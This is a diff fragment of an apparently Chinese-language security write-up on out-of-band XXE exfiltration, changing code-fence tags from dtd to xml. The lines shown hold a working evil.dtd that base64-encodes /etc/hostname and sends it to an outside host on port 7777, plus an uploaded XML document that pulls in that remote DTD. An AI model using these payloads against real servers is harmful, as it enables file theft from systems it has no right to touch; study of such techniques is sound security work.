@@ -63,7 +63,7 @@ payload =
 
 vps上部署evil.dtd
 
-```dtd
+```xml
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hostname">
 <!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://mekrina.tech:7777/?p=%file;'>">
 
@@ -76,7 +76,7 @@ send前面的%必须要编码%#x25，可能如果不编码会被识别为参数�
 
 上传的xml，`<?xml ... ?>`标签可有可无
 
-```dtd
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE convert [
 <!ENTITY % remote SYSTEM "http://ip:7777/evil.dtd">
